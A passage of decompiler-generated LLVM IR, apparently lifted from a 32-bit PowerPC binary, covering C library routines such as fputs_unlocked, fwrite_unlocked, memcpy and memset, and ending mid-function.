  %v4_1000e9c0 = icmp eq i32 %v0_1000e9b8, 1
  br i1 %v4_1000e9c0, label %dec_label_pc_1000e9c4, label %dec_label_pc_1000e958

dec_label_pc_1000e9c4:                            ; preds = %dec_label_pc_1000e9ac, %dec_label_pc_1000e9b8.backedge, %dec_label_pc_1000e96c, %dec_label_pc_1000e950, %dec_label_pc_1000e99c.dec_label_pc_1000e9c4_crit_edge
  %v2_1000e9d0 = phi i32 [ %v0_1000e9c4.pre, %dec_label_pc_1000e99c.dec_label_pc_1000e9c4_crit_edge ], [ %tmp, %dec_label_pc_1000e950 ], [ %v1_1000e97c, %dec_label_pc_1000e96c ], [ %v2_1000e97412, %dec_label_pc_1000e9b8.backedge ], [ %v1_1000e9b0, %dec_label_pc_1000e9ac ]
  %v1_1000e9c4 = load i32, i32* @r28, align 4
  %v3_1000e9c4 = icmp ugt i32 %v2_1000e9d0, %v1_1000e9c4
  %v4_1000e9c4 = icmp eq i32 %v2_1000e9d0, %v1_1000e9c4
  store i1 %v4_1000e9c4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000e9c4, label %dec_label_pc_1000e9cc, label %dec_label_pc_1000e9d8

dec_label_pc_1000e9cc:                            ; preds = %dec_label_pc_1000e9c4
  %v3_1000e9d0 = inttoptr i32 %v2_1000e9d0 to i8*
  store i8 0, i8* %v3_1000e9d0, align 1
  %v0_1000e9e0.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1000e9dc

dec_label_pc_1000e9d8:                            ; preds = %dec_label_pc_1000e99c, %dec_label_pc_1000e9c4, %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000e9dc

dec_label_pc_1000e9dc:                            ; preds = %dec_label_pc_1000e9cc, %dec_label_pc_1000e9d8
  %v0_1000e9e0 = phi i32 [ %v0_1000e9e0.pre, %dec_label_pc_1000e9cc ], [ 0, %dec_label_pc_1000e9d8 ]
  ret i32 %v0_1000e9e0

; uselistorder directives
  uselistorder i32 %v2_1000e9d0, { 0, 2, 1 }
  uselistorder i8 %v6_1000e988, { 1, 0, 2 }
  uselistorder i32 %v3_1000e95c, { 1, 0 }
  uselistorder i32 %v3_1000e958, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_1000e958, { 2, 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000e9dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000e9d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000e9c4, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1000e958, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000ea0c = call i32 @__GI_strlen()
  store i32 %v0_1000ea0c, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_1000ea28.639 to i32), i32* @lr, align 4
  %v4_1000ea24 = inttoptr i32 %arg2 to i16*
  %v5_1000ea24 = call i32 @__GI_fwrite_unlocked(i32 %arg1, i32 1, i32 %v0_1000ea0c, i16* %v4_1000ea24)
  %v1_1000ea2c = load i32, i32* @r27, align 4
  %v4_1000ea2c = icmp eq i32 %v5_1000ea24, %v1_1000ea2c
  br i1 %v4_1000ea2c, label %dec_label_pc_1000ea34, label %dec_label_pc_1000ea38

dec_label_pc_1000ea34:                            ; preds = %entry
  br label %dec_label_pc_1000ea38

dec_label_pc_1000ea38:                            ; preds = %entry, %dec_label_pc_1000ea34
  %v0_1000ea38 = phi i32 [ -1, %entry ], [ %v5_1000ea24, %dec_label_pc_1000ea34 ]
  ret i32 %v0_1000ea38

; uselistorder directives
  uselistorder label %dec_label_pc_1000ea38, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg2, i32* %r4.global-to-local, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r28, align 4
  %v3_1000ea68 = load i16, i16* %arg4, align 2
  %v4_1000ea68 = zext i16 %v3_1000ea68 to i32
  store i32 %tmp, i32* @r31, align 4
  store i32 128, i32* @r4, align 4
  store i32 %arg3, i32* @r30, align 4
  %v1_1000ea78 = call i32 @__asm_rlwinm(i32 %v4_1000ea68, i32 0, i32 24, i32 25)
  %v3_1000ea80 = icmp eq i32 %v1_1000ea78, 192
  br i1 %v3_1000ea80, label %dec_label_pc_1000ea94, label %dec_label_pc_1000ea88

dec_label_pc_1000ea88:                            ; preds = %entry
  store i32 268495500, i32* @lr, align 4
  %v3_1000ea88 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4)
  %v3_1000ea8c = icmp eq i32 %v3_1000ea88, 0
  br i1 %v3_1000ea8c, label %dec_label_pc_1000ea94, label %dec_label_pc_1000eaec

dec_label_pc_1000ea94:                            ; preds = %dec_label_pc_1000ea88, %entry
  %v0_1000ea94 = load i32, i32* @r29, align 4
  %v3_1000ea94 = icmp eq i32 %v0_1000ea94, 0
  %v0_1000ea98 = load i32, i32* @r30, align 4
  %v3_1000ea98 = icmp eq i32 %v0_1000ea98, 0
  %brmerge = or i1 %v3_1000ea94, %v3_1000ea98
  br i1 %brmerge, label %dec_label_pc_1000eaec, label %dec_label_pc_1000eaa4

dec_label_pc_1000eaa4:                            ; preds = %dec_label_pc_1000ea94
  %v2_1000eaac = udiv i32 -1, %v0_1000ea94
  %v0_1000eab0 = load i32, i32* @r31, align 4
  %v3_1000eab4 = icmp ugt i32 %v0_1000ea98, %v2_1000eaac
  %v1_1000eacc = inttoptr i32 %v0_1000eab0 to i16*
  br i1 %v3_1000eab4, label %dec_label_pc_1000eacc, label %dec_label_pc_1000eabc

dec_label_pc_1000eabc:                            ; preds = %dec_label_pc_1000eaa4
  %v0_1000eaa8 = load i32, i32* @r28, align 4
  %v2_1000eabc = mul i32 %v0_1000ea98, %v0_1000ea94
  store i32 %v2_1000eabc, i32* %r4.global-to-local, align 4
  store i32 268495556, i32* @lr, align 4
  %v5_1000eac0 = call i32 @__stdio_fwrite(i32 %v0_1000eaa8, i32 %v2_1000eabc, i16* %v1_1000eacc)
  %v1_1000eac4 = load i32, i32* @r29, align 4
  %v2_1000eac4 = udiv i32 %v5_1000eac0, %v1_1000eac4
  store i32 %v2_1000eac4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000eaf0

dec_label_pc_1000eacc:                            ; preds = %dec_label_pc_1000eaa4
  %v2_1000eacc = load i16, i16* %v1_1000eacc, align 2
  %v1_1000ead0 = or i16 %v2_1000eacc, 8
  store i16 %v1_1000ead0, i16* %v1_1000eacc, align 2
  %v0_1000ead8 = call i32 @__errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1000eae4 = inttoptr i32 %v0_1000ead8 to i32*
  store i32 22, i32* %v2_1000eae4, align 4
  %v0_1000eaf4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000eaf0

dec_label_pc_1000eaec:                            ; preds = %dec_label_pc_1000ea94, %dec_label_pc_1000ea88
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000eaf0

dec_label_pc_1000eaf0:                            ; preds = %dec_label_pc_1000eacc, %dec_label_pc_1000eabc, %dec_label_pc_1000eaec
  %v0_1000eaf4 = phi i32 [ %v0_1000eaf4.pre, %dec_label_pc_1000eacc ], [ %v2_1000eac4, %dec_label_pc_1000eabc ], [ 0, %dec_label_pc_1000eaec ]
  ret i32 %v0_1000eaf4

; uselistorder directives
  uselistorder i16* %v1_1000eacc, { 1, 2, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 (i32, i32, i16*)* @__stdio_fwrite, { 1, 2, 3, 5, 6, 0, 4 }
  uselistorder label %dec_label_pc_1000eaf0, { 2, 0, 1 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v0_1000eb08 = load i32, i32* @r5, align 4
  %v1_1000eb08 = call i32 @__asm_rlwinm.(i32 %v0_1000eb08, i32 29, i32 3, i32 31)
  store i32 %v1_1000eb08, i32* %r9.global-to-local, align 4
  %v4_1000eb08 = icmp eq i32 %v1_1000eb08, 0
  store i1 false, i1* @cr0_so, align 1
  %v0_1000eb0c = load i32, i32* @r4, align 4
  %v1_1000eb0c = add i32 %v0_1000eb0c, -4
  store i32 %v1_1000eb0c, i32* %r4.global-to-local, align 4
  %v0_1000eb10 = load i32, i32* @r3, align 4
  %v1_1000eb10 = add i32 %v0_1000eb10, -4
  store i32 %v1_1000eb10, i32* @r11, align 4
  br i1 %v4_1000eb08, label %dec_label_pc_1000eb38, label %dec_label_pc_1000eb18

dec_label_pc_1000eb18:                            ; preds = %entry
  %v1_1000eb18 = urem i32 %v1_1000eb10, 4
  %v3_1000eb18 = icmp eq i32 %v1_1000eb18, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000eb18, label %dec_label_pc_1000eb20, label %dec_label_pc_1000eb74

dec_label_pc_1000eb20:                            ; preds = %dec_label_pc_1000eb94.dec_label_pc_1000eb20_crit_edge, %dec_label_pc_1000eb18
  %v1_1000eb2c.pre = phi i32 [ %v1_1000eb10, %dec_label_pc_1000eb18 ], [ %v1_1000eb2c.pre.pre, %dec_label_pc_1000eb94.dec_label_pc_1000eb20_crit_edge ]
  %v0_1000eb20 = phi i32 [ %v1_1000eb08, %dec_label_pc_1000eb18 ], [ %v1_1000eb94, %dec_label_pc_1000eb94.dec_label_pc_1000eb20_crit_edge ]
  %.0 = phi i32 [ undef, %dec_label_pc_1000eb18 ], [ %v2_1000eb7c, %dec_label_pc_1000eb94.dec_label_pc_1000eb20_crit_edge ]
  store i32 %v0_1000eb20, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000eb24

dec_label_pc_1000eb24:                            ; preds = %dec_label_pc_1000eb24, %dec_label_pc_1000eb20
  %v1_1000eb2c = phi i32 [ %v2_1000eb30, %dec_label_pc_1000eb24 ], [ %v1_1000eb2c.pre, %dec_label_pc_1000eb20 ]
  %v0_1000eb24 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000eb24 = add i32 %v0_1000eb24, 4
  %v2_1000eb24 = inttoptr i32 %v1_1000eb24 to i32*
  %v3_1000eb24 = load i32, i32* %v2_1000eb24, align 4
  %v1_1000eb28 = add i32 %v0_1000eb24, 8
  %v2_1000eb28 = inttoptr i32 %v1_1000eb28 to i32*
  %v3_1000eb28 = load i32, i32* %v2_1000eb28, align 4
  store i32 %v3_1000eb28, i32* %r9.global-to-local, align 4
  store i32 %v1_1000eb28, i32* %r4.global-to-local, align 4
  %v2_1000eb2c = add i32 %v1_1000eb2c, 4
  %v3_1000eb2c = inttoptr i32 %v2_1000eb2c to i32*
  store i32 %v3_1000eb24, i32* %v3_1000eb2c, align 4
  %v0_1000eb30 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000eb30 = load i32, i32* @r11, align 4
  %v2_1000eb30 = add i32 %v1_1000eb30, 8
  %v3_1000eb30 = inttoptr i32 %v2_1000eb30 to i32*
  store i32 %v0_1000eb30, i32* %v3_1000eb30, align 4
  store i32 %v2_1000eb30, i32* @r11, align 4
  %v0_1000eb34 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000eb34 = add i32 %v0_1000eb34, -1
  store i32 %v1_1000eb34, i32* %ctr.global-to-local, align 4
  %v2_1000eb34 = icmp eq i32 %v1_1000eb34, 0
  br i1 %v2_1000eb34, label %dec_label_pc_1000eb38, label %dec_label_pc_1000eb24

dec_label_pc_1000eb38:                            ; preds = %dec_label_pc_1000eb24, %dec_label_pc_1000eb94, %entry
  %.1 = phi i32 [ undef, %entry ], [ %v2_1000eb7c, %dec_label_pc_1000eb94 ], [ %.0, %dec_label_pc_1000eb24 ]
  %v1_1000eb38 = urem i32 %.1, 8
  store i32 %v1_1000eb38, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000eb38, 4
  br i1 %tmp, label %dec_label_pc_1000eb50, label %dec_label_pc_1000eb44

dec_label_pc_1000eb44:                            ; preds = %dec_label_pc_1000eb38
  %v0_1000eb44 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000eb44 = add i32 %v0_1000eb44, 4
  %v2_1000eb44 = inttoptr i32 %v1_1000eb44 to i32*
  %v3_1000eb44 = load i32, i32* %v2_1000eb44, align 4
  store i32 %v1_1000eb44, i32* %r4.global-to-local, align 4
  %v1_1000eb48 = add nsw i32 %v1_1000eb38, -4
  store i32 %v1_1000eb48, i32* @r5, align 4
  %v1_1000eb4c = load i32, i32* @r11, align 4
  %v2_1000eb4c = add i32 %v1_1000eb4c, 4
  %v3_1000eb4c = inttoptr i32 %v2_1000eb4c to i32*
  store i32 %v3_1000eb44, i32* %v3_1000eb4c, align 4
  store i32 %v2_1000eb4c, i32* @r11, align 4
  %v0_1000eb50.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000eb50

dec_label_pc_1000eb50:                            ; preds = %dec_label_pc_1000eb38, %dec_label_pc_1000eb44
  %v0_1000eb50 = phi i32 [ %v1_1000eb38, %dec_label_pc_1000eb38 ], [ %v0_1000eb50.pre, %dec_label_pc_1000eb44 ]
  %v3_1000eb50 = icmp eq i32 %v0_1000eb50, 0
  %v0_1000eb54 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000eb50, i32 %v0_1000eb54)
  %v0_1000eb58 = load i32, i32* @r5, align 4
  store i32 %v0_1000eb58, i32* %ctr.global-to-local, align 4
  %v0_1000eb5c = load i32, i32* %r4.global-to-local, align 4
  %v1_1000eb5c = add i32 %v0_1000eb5c, 3
  store i32 %v1_1000eb5c, i32* %r4.global-to-local, align 4
  %v0_1000eb60 = load i32, i32* @r11, align 4
  %v1_1000eb60 = add i32 %v0_1000eb60, 3
  store i32 %v1_1000eb60, i32* %r9.global-to-local, align 4
  %v1_1000eb649 = add i32 %v0_1000eb5c, 4
  %v2_1000eb6410 = inttoptr i32 %v1_1000eb649 to i8*
  %v3_1000eb6411 = load i8, i8* %v2_1000eb6410, align 1
  store i32 %v1_1000eb649, i32* %r4.global-to-local, align 4
  %v3_1000eb6813 = add i32 %v0_1000eb60, 4
  %v4_1000eb6814 = inttoptr i32 %v3_1000eb6813 to i8*
  store i8 %v3_1000eb6411, i8* %v4_1000eb6814, align 1
  store i32 %v3_1000eb6813, i32* %r9.global-to-local, align 4
  %v0_1000eb6c15 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000eb6c16 = add i32 %v0_1000eb6c15, -1
  store i32 %v1_1000eb6c16, i32* %ctr.global-to-local, align 4
  %v2_1000eb6c17 = icmp eq i32 %v1_1000eb6c16, 0
  br i1 %v2_1000eb6c17, label %dec_label_pc_1000eba0, label %dec_label_pc_1000eb64.dec_label_pc_1000eb64_crit_edge

dec_label_pc_1000eb64.dec_label_pc_1000eb64_crit_edge: ; preds = %dec_label_pc_1000eb50, %dec_label_pc_1000eb64.dec_label_pc_1000eb64_crit_edge
  %v3_1000eb6818 = phi i32 [ %v3_1000eb68, %dec_label_pc_1000eb64.dec_label_pc_1000eb64_crit_edge ], [ %v3_1000eb6813, %dec_label_pc_1000eb50 ]
  %v0_1000eb64.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1000eb64 = add i32 %v0_1000eb64.pre, 1
  %v2_1000eb64 = inttoptr i32 %v1_1000eb64 to i8*
  %v3_1000eb64 = load i8, i8* %v2_1000eb64, align 1
  store i32 %v1_1000eb64, i32* %r4.global-to-local, align 4
  %v3_1000eb68 = add i32 %v3_1000eb6818, 1
  %v4_1000eb68 = inttoptr i32 %v3_1000eb68 to i8*
  store i8 %v3_1000eb64, i8* %v4_1000eb68, align 1
  store i32 %v3_1000eb68, i32* %r9.global-to-local, align 4
  %v0_1000eb6c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000eb6c = add i32 %v0_1000eb6c, -1
  store i32 %v1_1000eb6c, i32* %ctr.global-to-local, align 4
  %v2_1000eb6c = icmp eq i32 %v1_1000eb6c, 0
  br i1 %v2_1000eb6c, label %dec_label_pc_1000eba0, label %dec_label_pc_1000eb64.dec_label_pc_1000eb64_crit_edge

dec_label_pc_1000eb74:                            ; preds = %dec_label_pc_1000eb18
  %v1_1000eb74 = sub nsw i32 4, %v1_1000eb18
  store i32 %v1_1000eb74, i32* %ctr.global-to-local, align 4
  %v1_1000eb7c = load i32, i32* @r5, align 4
  %v2_1000eb7c = sub i32 %v1_1000eb7c, %v1_1000eb74
  br label %dec_label_pc_1000eb80

dec_label_pc_1000eb80:                            ; preds = %dec_label_pc_1000eb80.dec_label_pc_1000eb80_crit_edge, %dec_label_pc_1000eb74
  %v2_1000eb88 = phi i32 [ %v1_1000eb8c, %dec_label_pc_1000eb80.dec_label_pc_1000eb80_crit_edge ], [ %v1_1000eb10, %dec_label_pc_1000eb74 ]
  %v0_1000eb80 = phi i32 [ %v0_1000eb80.pre, %dec_label_pc_1000eb80.dec_label_pc_1000eb80_crit_edge ], [ %v1_1000eb0c, %dec_label_pc_1000eb74 ]
  %v1_1000eb80 = add i32 %v0_1000eb80, 4
  %v2_1000eb80 = inttoptr i32 %v1_1000eb80 to i8*
  %v3_1000eb80 = load i8, i8* %v2_1000eb80, align 1
  %v1_1000eb84 = add i32 %v0_1000eb80, 1
  store i32 %v1_1000eb84, i32* %r4.global-to-local, align 4
  %v3_1000eb88 = add i32 %v2_1000eb88, 4
  %v4_1000eb88 = inttoptr i32 %v3_1000eb88 to i8*
  store i8 %v3_1000eb80, i8* %v4_1000eb88, align 1
  %v0_1000eb8c = load i32, i32* @r11, align 4
  %v1_1000eb8c = add i32 %v0_1000eb8c, 1
  store i32 %v1_1000eb8c, i32* @r11, align 4
  %v0_1000eb90 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000eb90 = add i32 %v0_1000eb90, -1
  store i32 %v1_1000eb90, i32* %ctr.global-to-local, align 4
  %v2_1000eb90 = icmp eq i32 %v1_1000eb90, 0
  br i1 %v2_1000eb90, label %dec_label_pc_1000eb94, label %dec_label_pc_1000eb80.dec_label_pc_1000eb80_crit_edge

dec_label_pc_1000eb80.dec_label_pc_1000eb80_crit_edge: ; preds = %dec_label_pc_1000eb80
  %v0_1000eb80.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1000eb80

dec_label_pc_1000eb94:                            ; preds = %dec_label_pc_1000eb80
  %v1_1000eb94 = call i32 @__asm_rlwinm.(i32 %v2_1000eb7c, i32 29, i32 3, i32 31)
  store i32 %v1_1000eb94, i32* %r9.global-to-local, align 4
  %v4_1000eb94 = icmp eq i32 %v1_1000eb94, 0
  store i1 false, i1* @cr0_so, align 1
  br i1 %v4_1000eb94, label %dec_label_pc_1000eb38, label %dec_label_pc_1000eb94.dec_label_pc_1000eb20_crit_edge

dec_label_pc_1000eb94.dec_label_pc_1000eb20_crit_edge: ; preds = %dec_label_pc_1000eb94
  %v1_1000eb2c.pre.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_1000eb20

dec_label_pc_1000eba0:                            ; preds = %dec_label_pc_1000eb64.dec_label_pc_1000eb64_crit_edge, %dec_label_pc_1000eb50
  %v0_1000eba0 = load i32, i32* @r3, align 4
  ret i32 %v0_1000eba0

; uselistorder directives
  uselistorder i32 %v1_1000eb94, { 1, 2, 0 }
  uselistorder i32 %v1_1000eb90, { 1, 0 }
  uselistorder i32 %v1_1000eb8c, { 1, 0 }
  uselistorder i32 %v0_1000eb80, { 1, 0 }
  uselistorder i32 %v2_1000eb7c, { 2, 1, 0 }
  uselistorder i32 %v1_1000eb6c, { 1, 0 }
  uselistorder i32 %v3_1000eb68, { 1, 2, 0 }
  uselistorder i32 %v1_1000eb38, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1000eb34, { 1, 0 }
  uselistorder i32 %v2_1000eb30, { 1, 2, 0 }
  uselistorder i32 %v1_1000eb18, { 1, 0 }
  uselistorder i32 %v1_1000eb10, { 2, 1, 0, 3 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 4, 3, 0, 5, 8, 6, 10, 7, 9, 11 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 3, 5, 4, 0, 6, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_1000eb64.dec_label_pc_1000eb64_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb50, { 1, 0 }
  uselistorder label %dec_label_pc_1000eb38, { 1, 0, 2 }
}

define i32 @__GI_memset(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v1_1000eba4 = call i32 @__asm_rlwinm.(i32 %arg3, i32 29, i32 3, i32 31)
  store i32 %v1_1000eba4, i32* %r9.global-to-local, align 4
  %v4_1000eba4 = icmp eq i32 %v1_1000eba4, 0
  store i1 %v4_1000eba4, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  %v1_1000ebac = add i32 %arg1, -4
  store i32 %v1_1000ebac, i32* %r11.global-to-local, align 4
  %v1_1000ebb0 = call i32 @__asm_rlwimi(i32 %arg2, i32 8, i32 16, i32 23)
  %v1_1000ebb4 = call i32 @__asm_rlwimi(i32 %v1_1000ebb0, i32 16, i32 0, i32 15)
  %v2_1000ebb4 = trunc i32 %v1_1000ebb4 to i8
  %v0_1000ebb8 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_1000ebb8, label %dec_label_pc_1000ebdc, label %dec_label_pc_1000ebbc

dec_label_pc_1000ebbc:                            ; preds = %entry
  %v0_1000ebbc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ebbc = urem i32 %v0_1000ebbc, 4
  %v3_1000ebbc = icmp eq i32 %v1_1000ebbc, 0
  store i1 %v3_1000ebbc, i1* %cr0_eq.global-to-local, align 1
  store i1 false, i1* @cr0_so, align 1
  br i1 %v3_1000ebbc, label %dec_label_pc_1000ebbc.dec_label_pc_1000ebc4_crit_edge, label %dec_label_pc_1000ec0c

dec_label_pc_1000ebbc.dec_label_pc_1000ebc4_crit_edge: ; preds = %dec_label_pc_1000ebbc
  %v0_1000ebc4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ebc4

dec_label_pc_1000ebc4:                            ; preds = %dec_label_pc_1000ec24.dec_label_pc_1000ebc4_crit_edge, %dec_label_pc_1000ebbc.dec_label_pc_1000ebc4_crit_edge
  %v0_1000ebc8.pre = phi i32 [ %v0_1000ebbc, %dec_label_pc_1000ebbc.dec_label_pc_1000ebc4_crit_edge ], [ %v0_1000ebc8.pre.pre, %dec_label_pc_1000ec24.dec_label_pc_1000ebc4_crit_edge ]
  %v0_1000ebc4 = phi i32 [ %v0_1000ebc4.pre, %dec_label_pc_1000ebbc.dec_label_pc_1000ebc4_crit_edge ], [ %v1_1000ec24, %dec_label_pc_1000ec24.dec_label_pc_1000ebc4_crit_edge ]
  store i32 %v0_1000ebc4, i32* %ctr.global-to-local, align 4
  %v1_1000ebcc = sext i8 %v2_1000ebb4 to i32
  br label %dec_label_pc_1000ebc8

dec_label_pc_1000ebc8:                            ; preds = %dec_label_pc_1000ebc8, %dec_label_pc_1000ebc4
  %v0_1000ebc8 = phi i32 [ %v1_1000ebd4, %dec_label_pc_1000ebc8 ], [ %v0_1000ebc8.pre, %dec_label_pc_1000ebc4 ]
  %v1_1000ebc8 = add i32 %v0_1000ebc8, 4
  store i32 %v1_1000ebc8, i32* %r9.global-to-local, align 4
  %v4_1000ebcc = inttoptr i32 %v1_1000ebc8 to i32*
  store i32 %v1_1000ebcc, i32* %v4_1000ebcc, align 4
  %v2_1000ebd0 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000ebd0 = add i32 %v2_1000ebd0, 4
  %v4_1000ebd0 = inttoptr i32 %v3_1000ebd0 to i32*
  store i32 %v1_1000ebcc, i32* %v4_1000ebd0, align 4
  %v0_1000ebd4 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000ebd4 = add i32 %v0_1000ebd4, 4
  store i32 %v1_1000ebd4, i32* %r11.global-to-local, align 4
  %v0_1000ebd8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ebd8 = add i32 %v0_1000ebd8, -1
  store i32 %v1_1000ebd8, i32* %ctr.global-to-local, align 4
  %v2_1000ebd8 = icmp eq i32 %v1_1000ebd8, 0
  br i1 %v2_1000ebd8, label %dec_label_pc_1000ebdc, label %dec_label_pc_1000ebc8

dec_label_pc_1000ebdc:                            ; preds = %dec_label_pc_1000ebc8, %dec_label_pc_1000ec24, %entry
  %v0_1000ebdc = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ebdc = urem i32 %v0_1000ebdc, 8
  store i32 %v1_1000ebdc, i32* @r5, align 4
  %tmp = icmp ult i32 %v1_1000ebdc, 4
  br i1 %tmp, label %dec_label_pc_1000ebf0, label %dec_label_pc_1000ebe8

dec_label_pc_1000ebe8:                            ; preds = %dec_label_pc_1000ebdc
  %v1_1000ebe8 = sext i8 %v2_1000ebb4 to i32
  %v2_1000ebe8 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000ebe8 = add i32 %v2_1000ebe8, 4
  %v4_1000ebe8 = inttoptr i32 %v3_1000ebe8 to i32*
  store i32 %v1_1000ebe8, i32* %v4_1000ebe8, align 4
  store i32 %v3_1000ebe8, i32* %r11.global-to-local, align 4
  %v0_1000ebec = load i32, i32* @r5, align 4
  %v1_1000ebec = add i32 %v0_1000ebec, -4
  store i32 %v1_1000ebec, i32* @r5, align 4
  br label %dec_label_pc_1000ebf0

dec_label_pc_1000ebf0:                            ; preds = %dec_label_pc_1000ebdc, %dec_label_pc_1000ebe8
  %v0_1000ebf0 = phi i32 [ %v1_1000ebdc, %dec_label_pc_1000ebdc ], [ %v1_1000ebec, %dec_label_pc_1000ebe8 ]
  %v3_1000ebf0 = icmp eq i32 %v0_1000ebf0, 0
  %v0_1000ebf4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000ebf0, i32 %v0_1000ebf4)
  %v0_1000ebf8 = load i32, i32* @r5, align 4
  store i32 %v0_1000ebf8, i32* %ctr.global-to-local, align 4
  %v0_1000ebfc = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ebfc = add i32 %v0_1000ebfc, 3
  store i32 %v1_1000ebfc, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000ec00

dec_label_pc_1000ec00:                            ; preds = %dec_label_pc_1000ec00, %dec_label_pc_1000ebf0
  %v3_1000ec00 = phi i32 [ %v4_1000ec00, %dec_label_pc_1000ec00 ], [ %v1_1000ebfc, %dec_label_pc_1000ebf0 ]
  %v4_1000ec00 = add i32 %v3_1000ec00, 1
  %v5_1000ec00 = inttoptr i32 %v4_1000ec00 to i8*
  store i8 %v2_1000ebb4, i8* %v5_1000ec00, align 1
  store i32 %v4_1000ec00, i32* %r9.global-to-local, align 4
  %v0_1000ec04 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ec04 = add i32 %v0_1000ec04, -1
  store i32 %v1_1000ec04, i32* %ctr.global-to-local, align 4
  %v2_1000ec04 = icmp eq i32 %v1_1000ec04, 0
  br i1 %v2_1000ec04, label %dec_label_pc_1000ec30, label %dec_label_pc_1000ec00

dec_label_pc_1000ec0c:                            ; preds = %dec_label_pc_1000ebbc
  %v1_1000ec0c = sub nsw i32 4, %v1_1000ebbc
  store i32 %v1_1000ec0c, i32* %ctr.global-to-local, align 4
  %v1_1000ec14 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000ec14 = sub i32 %v1_1000ec14, %v1_1000ec0c
  store i32 %v2_1000ec14, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000ec18

dec_label_pc_1000ec18:                            ; preds = %dec_label_pc_1000ec18, %dec_label_pc_1000ec0c
  %v3_1000ec18 = phi i32 [ %v1_1000ec1c, %dec_label_pc_1000ec18 ], [ %v0_1000ebbc, %dec_label_pc_1000ec0c ]
  %v4_1000ec18 = add i32 %v3_1000ec18, 4
  %v5_1000ec18 = inttoptr i32 %v4_1000ec18 to i8*
  store i8 %v2_1000ebb4, i8* %v5_1000ec18, align 1
  %v0_1000ec1c = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ec1c = add i32 %v0_1000ec1c, 1
  store i32 %v1_1000ec1c, i32* %r11.global-to-local, align 4
  %v0_1000ec20 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ec20 = add i32 %v0_1000ec20, -1
  store i32 %v1_1000ec20, i32* %ctr.global-to-local, align 4
  %v2_1000ec20 = icmp eq i32 %v1_1000ec20, 0
  br i1 %v2_1000ec20, label %dec_label_pc_1000ec24, label %dec_label_pc_1000ec18

dec_label_pc_1000ec24:                            ; preds = %dec_label_pc_1000ec18
  %v0_1000ec24 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000ec24 = call i32 @__asm_rlwinm.(i32 %v0_1000ec24, i32 29, i32 3, i32 31)
  store i32 %v1_1000ec24, i32* %r9.global-to-local, align 4
